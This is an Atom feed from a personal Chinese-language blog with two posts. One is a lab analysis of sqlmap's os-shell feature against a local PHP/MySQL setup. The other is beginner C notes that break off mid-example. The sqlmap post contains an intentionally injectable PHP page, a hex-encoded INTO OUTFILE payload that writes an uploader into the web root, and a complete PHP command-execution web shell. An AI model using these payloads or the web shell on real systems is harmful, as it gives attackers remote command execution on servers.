<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>9finger</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="/"/>
  <updated>2019-11-26T07:24:14.800Z</updated>
  <id>/</id>
  
  <author>
    <name>9finger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqlmap-os-shell分析</title>
    <link href="/2019/11/25/sqlmap-os-shell%E5%88%86%E6%9E%90/"/>
    <id>/2019/11/25/sqlmap-os-shell分析/</id>
    <published>2019-11-25T04:00:00.000Z</published>
    <updated>2019-11-26T07:24:14.800Z</updated>
    
    <content type="html"><![CDATA[<p>闲着无聊，琢磨一下sqlmap-os-shell。</p><a id="more"></a><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p><strong>环境：</strong>phpstudy，Apache2.4.39，MySQL5.7.26</p><p><strong>条件：</strong></p><p> <strong>（1）网站必须是root权限</strong></p><p><strong>（2）攻击者需要知道网站的绝对路径</strong></p><p><strong>（3）GPC为off，php主动转义的功能关闭</strong> </p><p><strong>（4）MySQL允许写入文件</strong> </p><p><strong>php源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">写这个php最初目的是为了给自己测WAF用，和深入了解SQL注入。</span></span><br><span class="line"><span class="comment">可以打印你查询的结果，和打印你调用的SQL语句。</span></span><br><span class="line"><span class="comment">使用到了pikachu的库</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 设置编码为utf-8</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$password = <span class="string">"root"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span> . $conn-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"连接成功"</span>;</span><br><span class="line">$chaxun = $_GET[<span class="string">"id"</span>];</span><br><span class="line">mysqli_query($conn,<span class="string">'use pikachu;'</span>);<span class="comment">//连接数据库并使用pikachu库</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE username= '$chaxun'"</span>;<span class="comment">//查询语句</span></span><br><span class="line">$result = mysqli_query($conn,$sql);<span class="comment">//使用mysqli_query函数调用sql语句</span></span><br><span class="line"><span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;<span class="comment">//查询后的结果集里取一行并赋值给row</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;账号："</span>.$row[<span class="string">'username'</span>];<span class="comment">//打印user行的内容</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"密码："</span>.$row[<span class="string">'password'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;br&gt;&lt;b&gt;SQL语句为：&lt;/b&gt;$sql&lt;/br&gt;"</span>;</span><br><span class="line"><span class="comment">//加粗并换行打印出来</span></span><br><span class="line">$conn-&gt;close();</span><br><span class="line"><span class="comment">//查询后不管有没有都记得关闭数据库</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="php设置自动转义"><a href="#php设置自动转义" class="headerlink" title="php设置自动转义"></a>php设置自动转义</h3><p><img alt data-src="..%5Cimages%5Csqlmap-os-shell%E5%88%86%E6%9E%90%5C6.png" class="lazyload"></p><h3 id="MySQL设置可以写入文件"><a href="#MySQL设置可以写入文件" class="headerlink" title="MySQL设置可以写入文件"></a>MySQL设置可以写入文件</h3><p>看了一下sqlmap执行os-shell的第一个payload，是一个写入文件的操作，我直接在mysql内执行出现报错。</p><p><img alt data-src="..%5Cimages%5Csqlmap-os-shell%E5%88%86%E6%9E%90%5C2.png" class="lazyload"></p><p>开始执行语句的时候，提示报错。</p><p><img alt data-src="..%5Cimages%5Csqlmap-os-shell%E5%88%86%E6%9E%90%5C1.png" class="lazyload"></p><p> 通过报错的提示可以发现是由于secure-file-priv变量的设置所引起的 。然后我在mysql的配置文件里面加secure-file-priv的变量配置。</p><p><img alt data-src="..%5Cimages%5Csqlmap-os-shell%E5%88%86%E6%9E%90%5C3.png" class="lazyload"></p><p><strong>说明：</strong></p><p>secure_file_prive=null  限制mysqld 不允许导入导出</p><p>secure_file_priv=/var/lib/mysql-files/  限制mysqld的导入导出只能发生在/var/lib/mysql-files/目录下</p><p>secure_file_priv=’ ‘   不对mysqld的导入导出做限制</p><p>执行数据库语句以后，效果如下</p><p><img alt data-src="..%5Cimages%5Csqlmap-os-shell%E5%88%86%E6%9E%90%5C4.gif" class="lazyload"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username= <span class="string">'admin'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'D:/phpstudy_pro/WWW/tmpuslcm.php'</span> <span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="number">0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d443a5c5c70687073747564795f70726f5c5c5757575c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p>sqlmap的第一个payload就是写入一个php上传文件的web。</p><p><img alt data-src="..%5Cimages%5Csqlmap-os-shell%E5%88%86%E6%9E%90%5C5.png" class="lazyload"></p><p>看看sqlmap写入一个上传文件的web之后的操作。</p><p><img alt data-src="..%5Cimages%5Csqlmap-os-shell%E5%88%86%E6%9E%90%5C7.png" class="lazyload"></p><p>sqlmap又通过之前写入的上传文件的php，上传了一个php。看一下这个php的代码。</p><p><img alt data-src="..%5Cimages%5Csqlmap-os-shell%E5%88%86%E6%9E%90%5C8.png" class="lazyload"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $c=$_REQUEST[<span class="string">"cmd"</span>];@set_time_limit(<span class="number">0</span>);@ignore_user_abort(<span class="number">1</span>);@ini_set(<span class="string">"max_execution_time"</span>,<span class="number">0</span>);$z=@ini_get(<span class="string">"disable_functions"</span>);<span class="keyword">if</span>(!<span class="keyword">empty</span>($z))&#123;$z=preg_replace(<span class="string">"/[, ]+/"</span>,<span class="string">','</span>,$z);$z=explode(<span class="string">','</span>,$z);$z=array_map(<span class="string">"trim"</span>,$z);&#125;<span class="keyword">else</span>&#123;$z=<span class="keyword">array</span>();&#125;$c=$c.<span class="string">" 2&gt;&amp;1\n"</span>;<span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">($n)</span></span>&#123;<span class="keyword">global</span> $z;<span class="keyword">return</span> is_callable($n)<span class="keyword">and</span>!in_array($n,$z);&#125;<span class="keyword">if</span>(f(<span class="string">"system"</span>))&#123;ob_start();system($c);$w=ob_get_clean();&#125;<span class="keyword">elseif</span>(f(<span class="string">"proc_open"</span>))&#123;$y=proc_open($c,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),$t);$w=<span class="keyword">NULL</span>;<span class="keyword">while</span>(!feof($t[<span class="number">1</span>]))&#123;$w.=fread($t[<span class="number">1</span>],<span class="number">512</span>);&#125;@proc_close($y);&#125;<span class="keyword">elseif</span>(f(<span class="string">"shell_exec"</span>))&#123;$w=shell_exec($c);&#125;<span class="keyword">elseif</span>(f(<span class="string">"passthru"</span>))&#123;ob_start();passthru($c);$w=ob_get_clean();&#125;<span class="keyword">elseif</span>(f(<span class="string">"popen"</span>))&#123;$x=popen($c,r);$w=<span class="keyword">NULL</span>;<span class="keyword">if</span>(is_resource($x))&#123;<span class="keyword">while</span>(!feof($x))&#123;$w.=fread($x,<span class="number">512</span>);&#125;&#125;@pclose($x);&#125;<span class="keyword">elseif</span>(f(<span class="string">"exec"</span>))&#123;$w=<span class="keyword">array</span>();exec($c,$w);$w=join(chr(<span class="number">10</span>),$w).chr(<span class="number">10</span>);&#125;<span class="keyword">else</span>&#123;$w=<span class="number">0</span>;&#125;<span class="keyword">echo</span><span class="string">"&lt;pre&gt;$w&lt;/pre&gt;"</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个web马，就和sqlmap连接成一个交互式的shell。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>sqlmap-os-shell的MySQL执行条件，php开启了自动转义，MySQL执行开启了写入函数。</p><p>存在注入的前提，配置不当。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;闲着无聊，琢磨一下sqlmap-os-shell。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>C语言学习笔记</title>
    <link href="/2019/11/06/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>/2019/11/06/C语言学习笔记/</id>
    <published>2019-11-06T04:00:00.000Z</published>
    <updated>2019-11-16T07:57:39.969Z</updated>
    
    <content type="html"><![CDATA[<p>学习C语言，自己做的笔记。<del>其实大多是抄菜鸟教程的，只是是自己理解要记的部分。</del></p><a id="more"></a><h1 id="C语言学习笔记"><a href="#C语言学习笔记" class="headerlink" title="C语言学习笔记"></a>C语言学习笔记</h1><h2 id="C-程序结构"><a href="#C-程序结构" class="headerlink" title="C 程序结构"></a>C 程序结构</h2><p>C 程序主要包括以下部分：</p><ul><li>预处理器指令</li><li>函数</li><li>变量</li><li>语句 &amp; 表达式</li><li>注释</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/* 我的第一个 C 程序 */</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Hello, World! \n"</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>程序的第一行 *#include * 是预处理器指令，告诉 C 编译器在实际编译之前要包含 stdio.h 文件。</li><li>下一行 <em>int main()</em> 是主函数，程序从这里开始执行。</li><li>下一行 /<em>…</em>/ 将会被编译器忽略，这里放置程序的注释内容。它们被称为程序的注释。</li><li>下一行 <em>printf(…)</em> 是 C 中另一个可用的函数，会在屏幕上显示消息 “Hello, World!”。</li><li>下一行 <strong>return 0;</strong> 终止 main() 函数，并返回值 0。</li></ol><h2 id="C-基本语法"><a href="#C-基本语法" class="headerlink" title="C 基本语法"></a>C 基本语法</h2><p> C 程序由各种令牌组成，令牌可以是关键字、标识符、常量、字符串值，或者是一个符号。 </p><p>下表列出了 C 中的保留字。这些保留字不能作为常量名、变量名或其他标识符名称。</p><table><thead><tr><th align="left">关键字</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">auto</td><td align="left">声明自动变量</td></tr><tr><td align="left">break</td><td align="left">跳出当前循环</td></tr><tr><td align="left">case</td><td align="left">开关语句分支</td></tr><tr><td align="left">char</td><td align="left">声明字符型变量或函数返回值类型</td></tr><tr><td align="left">const</td><td align="left">声明只读变量</td></tr><tr><td align="left">continue</td><td align="left">结束当前循环，开始下一轮循环</td></tr><tr><td align="left">default</td><td align="left">开关语句中的”其它”分支</td></tr><tr><td align="left">do</td><td align="left">循环语句的循环体</td></tr><tr><td align="left">double</td><td align="left">声明双精度浮点型变量或函数返回值类型</td></tr><tr><td align="left">else</td><td align="left">条件语句否定分支（与 if 连用）</td></tr><tr><td align="left">enum</td><td align="left">声明枚举类型</td></tr><tr><td align="left">extern</td><td align="left">声明变量或函数是在其它文件或本文件的其他位置定义</td></tr><tr><td align="left">float</td><td align="left">声明浮点型变量或函数返回值类型</td></tr><tr><td align="left">for</td><td align="left">一种循环语句</td></tr><tr><td align="left">goto</td><td align="left">无条件跳转语句</td></tr><tr><td align="left">if</td><td align="left">条件语句</td></tr><tr><td align="left">int</td><td align="left">声明整型变量或函数</td></tr><tr><td align="left">long</td><td align="left">声明长整型变量或函数返回值类型</td></tr><tr><td align="left">register</td><td align="left">声明寄存器变量</td></tr><tr><td align="left">return</td><td align="left">子程序返回语句（可以带参数，也可不带参数）</td></tr><tr><td align="left">short</td><td align="left">声明短整型变量或函数</td></tr><tr><td align="left">signed</td><td align="left">声明有符号类型变量或函数</td></tr><tr><td align="left">sizeof</td><td align="left">计算数据类型或变量长度（即所占字节数）</td></tr><tr><td align="left">static</td><td align="left">声明静态变量</td></tr><tr><td align="left">struct</td><td align="left">声明结构体类型</td></tr><tr><td align="left">switch</td><td align="left">用于开关语句</td></tr><tr><td align="left">typedef</td><td align="left">用以给数据类型取别名</td></tr><tr><td align="left">unsigned</td><td align="left">声明无符号类型变量或函数</td></tr><tr><td align="left">union</td><td align="left">声明共用体类型</td></tr><tr><td align="left">void</td><td align="left">声明函数无返回值或无参数，声明无类型指针</td></tr><tr><td align="left">volatile</td><td align="left">说明变量在程序执行中可被隐含地改变</td></tr><tr><td align="left">while</td><td align="left">循环语句的循环条件</td></tr></tbody></table><h2 id="C-数据类型"><a href="#C-数据类型" class="headerlink" title="C 数据类型"></a>C 数据类型</h2><p>在 C 语言中，数据类型指的是用于声明不同类型的变量或函数的一个广泛的系统。变量的类型决定了变量存储占用的空间，以及如何解释存储的位模式。</p><p>C 中的类型可分为以下几种：</p><table><thead><tr><th align="left">序号</th><th align="left">类型与描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>基本类型：</strong> 它们是算术类型，包括两种类型：整数类型和浮点类型。</td></tr><tr><td align="left">2</td><td align="left"><strong>枚举类型：</strong> 它们也是算术类型，被用来定义在程序中只能赋予其一定的离散整数值的变量。</td></tr><tr><td align="left">3</td><td align="left"><strong>void 类型：</strong> 类型说明符 <em>void</em> 表明没有可用的值。</td></tr><tr><td align="left">4</td><td align="left"><strong>派生类型：</strong> 它们包括：指针类型、数组类型、结构类型、共用体类型和函数类型。</td></tr></tbody></table><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><p>下表列出了关于标准整数类型的存储大小和值范围的细节：</p><table><thead><tr><th align="left">类型</th><th align="left">存储大小</th><th align="left">值范围</th></tr></thead><tbody><tr><td align="left">char</td><td align="left">1 字节</td><td align="left">-128 到 127 或 0 到 255</td></tr><tr><td align="left">unsigned char</td><td align="left">1 字节</td><td align="left">0 到 255</td></tr><tr><td align="left">signed char</td><td align="left">1 字节</td><td align="left">-128 到 127</td></tr><tr><td align="left">int</td><td align="left">2 或 4 字节</td><td align="left">-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647</td></tr><tr><td align="left">unsigned int</td><td align="left">2 或 4 字节</td><td align="left">0 到 65,535 或 0 到 4,294,967,295</td></tr><tr><td align="left">short</td><td align="left">2 字节</td><td align="left">-32,768 到 32,767</td></tr><tr><td align="left">unsigned short</td><td align="left">2 字节</td><td align="left">0 到 65,535</td></tr><tr><td align="left">long</td><td align="left">4 字节</td><td align="left">-2,147,483,648 到 2,147,483,647</td></tr><tr><td align="left">unsigned long</td><td align="left">4 字节</td><td align="left">0 到 4,294,967,295</td></tr></tbody></table><h3 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h3><p>下表列出了关于标准浮点类型的存储大小、值范围和精度的细节：</p><table><thead><tr><th align="left">类型</th><th align="left">存储大小</th><th align="left">值范围</th><th align="left">精度</th></tr></thead><tbody><tr><td align="left">float</td><td align="left">4 字节</td><td align="left">1.2E-38 到 3.4E+38</td><td align="left">6 位小数</td></tr><tr><td align="left">double</td><td align="left">8 字节</td><td align="left">2.3E-308 到 1.7E+308</td><td align="left">15 位小数</td></tr><tr><td align="left">long double</td><td align="left">16 字节</td><td align="left">3.4E-4932 到 1.1E+4932</td><td align="left">19 位小数</td></tr></tbody></table><p>头文件 float.h 定义了宏，在程序中可以使用这些值和其他有关实数二进制表示的细节。下面的实例将输出浮点类型占用的存储空间以及它的范围</p><h3 id="void-类型"><a href="#void-类型" class="headerlink" title="void 类型"></a>void 类型</h3><p>void 类型指定没有可用的值。它通常用于以下三种情况下：</p><table><thead><tr><th align="left">序号</th><th align="left">类型与描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>函数返回为空</strong> C 中有各种函数都不返回值，或者您可以说它们返回空。不返回值的函数的返回类型为空。例如 <strong>void exit (int status);</strong></td></tr><tr><td align="left">2</td><td align="left"><strong>函数参数为空</strong> C 中有各种函数不接受任何参数。不带参数的函数可以接受一个 void。例如 <strong>int rand(void);</strong></td></tr><tr><td align="left">3</td><td align="left"><strong>指针指向 void</strong> 类型为 void * 的指针代表对象的地址，而不是类型。例如，内存分配函数 <strong>void *malloc( size_t size );</strong> 返回指向 void 的指针，可以转换为任何数据类型。</td></tr></tbody></table><h2 id="C-变量"><a href="#C-变量" class="headerlink" title="C 变量"></a>C 变量</h2><p>变量其实只不过是程序可操作的存储区的名称。C 中每个变量都有特定的类型，类型决定了变量存储的大小和布局，该范围内的值都可以存储在内存中，运算符可应用于变量上。</p><p>变量的名称可以由字母、数字和下划线字符组成。它必须以字母或下划线开头。大写字母和小写字母是不同的，因为 C 是大小写敏感的。</p><table><thead><tr><th align="left">类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">char</td><td align="left">通常是一个字节（八位）。这是一个整数类型。</td></tr><tr><td align="left">int</td><td align="left">对机器而言，整数的最自然的大小。</td></tr><tr><td align="left">float</td><td align="left">单精度浮点值。单精度是这样的格式，1位符号，8位指数，23位小数。<img alt="img" data-src="https://www.runoob.com/wp-content/uploads/2014/09/v2-749cc641eb4d5dafd085e8c23f8826aa_hd.png" class="lazyload"></td></tr><tr><td align="left">double</td><td align="left">双精度浮点值。双精度是1位符号，11位指数，52位小数。<img alt="img" data-src="https://www.runoob.com/wp-content/uploads/2014/09/v2-48240f0e1e0dd33ec89100cbe2d30707_hd.png" class="lazyload"></td></tr><tr><td align="left">void</td><td align="left">表示类型的缺失。</td></tr></tbody></table><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 函数外定义变量 x 和 y</span></span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addtwonum</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 函数内声明变量 x 和 y 为外部变量</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> y;</span><br><span class="line">    <span class="comment">// 给外部变量（全局变量）x 和 y 赋值</span></span><br><span class="line">    x = <span class="number">1</span>;</span><br><span class="line">    y = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="comment">// 调用函数 addtwonum</span></span><br><span class="line">    result = addtwonum();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"result 为: %d"</span>,result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result 为: <span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="C-常量"><a href="#C-常量" class="headerlink" title="C 常量"></a>C 常量</h2><h3 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h3><p>整数常量可以是十进制、八进制或十六进制的常量。前缀指定基数：0x 或 0X 表示十六进制，0 表示八进制，不带前缀则默认表示十进制。</p><p>整数常量也可以带一个后缀，后缀是 U 和 L 的组合，U 表示无符号整数（unsigned），L 表示长整数（long）。后缀可以是大写，也可以是小写，U 和 L 的顺序任意。</p><p>下面列举几个整数常量的实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">212</span>         <span class="comment">/* 合法的 */</span></span><br><span class="line"><span class="number">215u</span>        <span class="comment">/* 合法的 */</span></span><br><span class="line"><span class="number">0xFee</span>L      <span class="comment">/* 合法的 */</span></span><br><span class="line"><span class="number">078</span>         <span class="comment">/* 非法的：8 不是八进制的数字 */</span></span><br><span class="line"><span class="number">032U</span>U       <span class="comment">/* 非法的：不能重复后缀 */</span></span><br></pre></td></tr></table></figure><p>以下是各种类型的整数常量的实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">85</span>         <span class="comment">/* 十进制 */</span></span><br><span class="line"><span class="number">0213</span>       <span class="comment">/* 八进制 */</span></span><br><span class="line"><span class="number">0x4b</span>       <span class="comment">/* 十六进制 */</span></span><br><span class="line"><span class="number">30</span>         <span class="comment">/* 整数 */</span></span><br><span class="line"><span class="number">30u</span>        <span class="comment">/* 无符号整数 */</span></span><br><span class="line"><span class="number">30l</span>        <span class="comment">/* 长整数 */</span></span><br><span class="line"><span class="number">30u</span>l       <span class="comment">/* 无符号长整数 */</span></span><br></pre></td></tr></table></figure><h3 id="浮点常量"><a href="#浮点常量" class="headerlink" title="浮点常量"></a>浮点常量</h3><p>浮点常量由整数部分、小数点、小数部分和指数部分组成。您可以使用小数形式或者指数形式来表示浮点常量。</p><p>当使用小数形式表示时，必须包含整数部分、小数部分，或同时包含两者。当使用指数形式表示时， 必须包含小数点、指数，或同时包含两者。带符号的指数是用 e 或 E 引入的。</p><p>下面列举几个浮点常量的实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">3.14159       /* 合法的 */</span><br><span class="line">314159E-5L    /* 合法的 */</span><br><span class="line">510E          /* 非法的：不完整的指数 */</span><br><span class="line">210f          /* 非法的：没有小数或指数 */</span><br><span class="line">.e55          /* 非法的：缺少整数或分数 */</span><br></pre></td></tr></table></figure><h3 id="字符常量"><a href="#字符常量" class="headerlink" title="字符常量"></a>字符常量</h3><p>字符常量是括在单引号中，例如，’x’ 可以存储在 <strong>char</strong> 类型的简单变量中。</p><p>字符常量可以是一个普通的字符（例如 ‘x’）、一个转义序列（例如 ‘\t’），或一个通用的字符（例如 ‘\u02C0’）。</p><p>在 C 中，有一些特定的字符，当它们前面有反斜杠时，它们就具有特殊的含义，被用来表示如换行符（\n）或制表符（\t）等。下表列出了一些这样的转义序列码：</p><table><thead><tr><th align="left">转义序列</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">\</td><td align="left">\ 字符</td></tr><tr><td align="left">&#39;</td><td align="left">‘ 字符</td></tr><tr><td align="left">&quot;</td><td align="left">“ 字符</td></tr><tr><td align="left">?</td><td align="left">? 字符</td></tr><tr><td align="left">\a</td><td align="left">警报铃声</td></tr><tr><td align="left">\b</td><td align="left">退格键</td></tr><tr><td align="left">\f</td><td align="left">换页符</td></tr><tr><td align="left">\n</td><td align="left">换行符</td></tr><tr><td align="left">\r</td><td align="left">回车</td></tr><tr><td align="left">\t</td><td align="left">水平制表符</td></tr><tr><td align="left">\v</td><td align="left">垂直制表符</td></tr><tr><td align="left">\ooo</td><td align="left">一到三位的八进制数</td></tr><tr><td align="left">\xhh . . .</td><td align="left">一个或多个数字的十六进制数</td></tr></tbody></table><h3 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"hello, dear"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"hello, \</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dear"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"hello, "</span> <span class="string">"d"</span> <span class="string">"ear"</span></span><br></pre></td></tr></table></figure><h3 id="定义常量"><a href="#定义常量" class="headerlink" title="定义常量"></a>定义常量</h3><p>在 C 中，有两种简单的定义常量的方式：</p><ol><li>使用 <strong>#define</strong> 预处理器。</li><li>使用 <strong>const</strong> 关键字。</li></ol><h4 id="define-预处理器"><a href="#define-预处理器" class="headerlink" title="#define 预处理器"></a>#define 预处理器</h4><p>下面是使用 #define 预处理器定义常量的形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> identifier value</span></span><br></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 